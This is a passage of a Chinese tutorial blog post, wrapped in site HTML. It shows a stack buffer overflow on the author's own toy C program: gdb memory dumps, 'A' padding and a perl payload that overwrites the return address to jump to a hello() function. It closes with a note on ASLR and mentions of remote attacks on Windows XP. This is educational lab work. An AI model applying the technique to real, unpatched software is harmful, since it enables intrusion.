class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到寄存器中有4个41，因为A的ASCII码对应的就是41，我们传入4个A就会有4个41。</p>
+<p>在命令行中输入14个A重新运行，然后再次到达13行断点位置，查看寄存器内容<br>为了方便操作，这里使用perl语言输出数据配合运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r `perl -e <span class="string">'print "A"x14'</span>`</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/lanshiqin/桌面/main `perl -e <span class="string">'print "A"x14'</span>`</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=2, argv=0xffffd084) at main.c:20</span><br><span class="line">20	    fun(str);</span><br><span class="line">(gdb) n</span><br><span class="line"></span><br><span class="line">Breakpoint 1, fun (str=0xffffd27f <span class="string">'A'</span> &lt;repeats 14 <span class="built_in">times</span>&gt;) at main.c:13</span><br><span class="line">13	    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcf90:	0xffffffff	0x4141002f	0x41414141	0x41414141</span><br><span class="line">0xffffcfa0:	0x41414141	0xf7fb8000	0xffffcfd8	0x080484a9</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到寄存器中已经有14个A的ASCII码值41了，除此之外，还可以看到call指令下面的指令地址<code>0x080484a9</code>也在寄存器中了,我们要做的就是覆盖这个地址，<font color="red" face="黑体">只要将这个地址修改为hello函数所在的地址，<br>那么程序就会 执行hello函数。</font><br>通过观察发现，要用A覆盖满底下的寄存器数据，还需要12个A，也就是总共需要26个A才能全部覆盖。<br>在命令行中输入26个A重新运行，然后再次到达13行断点位置，查看寄存器内容。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r `perl -e <span class="string">'print "A"x26'</span>`</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/lanshiqin/桌面/main `perl -e <span class="string">'print "A"x26'</span>`</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:20</span><br><span class="line">20	    fun(str);</span><br><span class="line">(gdb) n</span><br><span class="line"></span><br><span class="line">Breakpoint 1, fun (str=0xffffd200 <span class="string">"\027"</span>) at main.c:13</span><br><span class="line">13	    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">(gdb) x/8x <span class="variable">$esp</span></span><br><span class="line">0xffffcf80:	0xffffffff	0x4141002f	0x41414141	0x41414141</span><br><span class="line">0xffffcf90:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到26个A已经把最后的数据全部覆盖了，我们要做的是让程序执行到hello函数，<br>所以我们只需要<font color="red" face="黑体">22个A并且加上hello函数的首地址</font>。<br>通过调试可知hello函数的首地址是<code>0x0804843b</code>,我们使用perl对地址进行格式化输出，需要将这个16进制地址由后向前每两位进行一个\x拼接，得到的内容是 <code>\x3b\x84\x04\x08</code>。</p>
+<p>在命令行中输入22个A加上hello函数地址重新运行,一路输入n单步运行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r `perl -e <span class="string">'print "A"x22;print "\x3b\x84\x04\x08"'</span>`</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/lanshiqin/桌面/main `perl -e <span class="string">'print "A"x22;print "\x3b\x84\x04\x08"'</span>`</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=2, argv=0xffffd074) at main.c:20</span><br><span class="line">20	    fun(str);</span><br><span class="line">(gdb) n</span><br><span class="line"></span><br><span class="line">Breakpoint 1, fun (str=0xffffd200 <span class="string">"\027"</span>) at main.c:13</span><br><span class="line">13	    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">(gdb) n</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAA;�</span><br><span class="line">14	    <span class="built_in">return</span> 0;</span><br><span class="line">(gdb) n</span><br><span class="line">15	&#125;</span><br><span class="line">(gdb) n</span><br><span class="line">hello () at main.c:5</span><br><span class="line">5	&#123;</span><br><span class="line">(gdb) n</span><br><span class="line">6	    <span class="built_in">printf</span>(<span class="string">"hello\n"</span>);</span><br><span class="line">(gdb) n</span><br><span class="line">hello</span><br><span class="line">7	&#125;</span><br><span class="line">(gdb) n</span><br></pre></td></tr></table></figure></p>
+<p>可以看到上面的程序已经执行到hello函数了，我们可以输入q命令退出调试。</p>
+<p>为了验证缓冲区溢出漏洞，我们现在直接运行程序，后面跟上我们之前调试分析时得到的结论数据进行运行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lanshiqin@lanshiqin-Parallels-Virtual-Platform:~/桌面$ ./main `perl -e <span class="string">'print "A"x22;print "\x3b\x84\x04\x08"'</span>`</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAA;�</span><br><span class="line">hello</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure></p>
+<p><font color="red" size="5" face="黑体">可以看到程序调用了hello函数，并且成功输出了hello。</font><br><img src="/e2f22ec7/5.png" title="overflow"><br>虽然最后提示程序段错误，但是我们已经成功的通过让程序接收数据的缓冲区溢出，改变了程序的执行逻辑，执行了其他函数。</p>
+<p>如果这是个具有网络通信功能的程序，通过缓冲区漏洞可以使攻击者远程执行任意代码，得到目标系统的控制权。<br>缓冲区溢出攻击成为远程攻击的主要手段，攻击者通过目标ip地址扫描计算机的开放的端口，并对端口程序进行缓冲区溢出攻击，如果这个端口的程序存在缓冲区漏洞，那么这台计算机将会被攻陷。</p>
+<h2 id="防范部分："><a href="#防范部分：" class="headerlink" title="防范部分："></a>防范部分：</h2><p>现代操作系统对缓冲区溢出攻击做了防范，比如ASLR(地址空间布局随机化),是参与保护缓冲区溢出问题的一个计算机安全技术。是为了防止攻击者在内存中能够可靠地对跳转到特定利用函数。ASLR包括随机排列程序的关键数据区域的位置，包括可执行的部分、堆、栈及共享库的位置。</p>
+<p>缓冲区溢出普遍存在于旧版系统等程序上，比如Windows xp的pop3服务就存在缓存区溢出漏洞，通过该漏洞可以注入shellocode,拿到控制权进行任意操作，比如开启3389端口添加用户等操作，随后就可以通过添加的用户进行远程登录，Windows XP 系统目前在国内的学校和一些政府机构依然在使用，下一个实验内容我将会记录如何通过缓冲区溢出漏洞 远程入侵操作系统。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/逆向-汇编-实验/" rel="tag"># 逆向 汇编 实验</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/d7e81382/" rel="next" title="Hello World 的漏洞">
+                <i class="fa fa-chevron-left"></i> Hello World 的漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/38f11925/" rel="prev" title="搭建ngrok服务器">
+                搭建ngrok服务器 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="蓝士钦" />
+            
+              <p class="site-author-name" itemprop="name">蓝士钦</p>
+              <p class="site-description motion-element" itemprop="description">蓝士钦</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lanshiqin" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:lanshiqin@outlook.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念部分："><span class="nav-number">1.</span> <span class="nav-text">概念部分：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#要做的事："><span class="nav-number">2.</span> <span class="nav-text">要做的事：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用的系统和工具："><span class="nav-number">3.</span> <span class="nav-text">使用的系统和工具：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验部分："><span class="nav-number">4.</span> <span class="nav-text">实验部分：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防范部分："><span class="nav-number">5.</span> <span class="nav-text">防范部分：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">蓝士钦</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+  <div class="footer-custom">闽ICP备15027850号</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 --> 
+<script type="text/javascript" src="/js/src/love.js"></script>
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
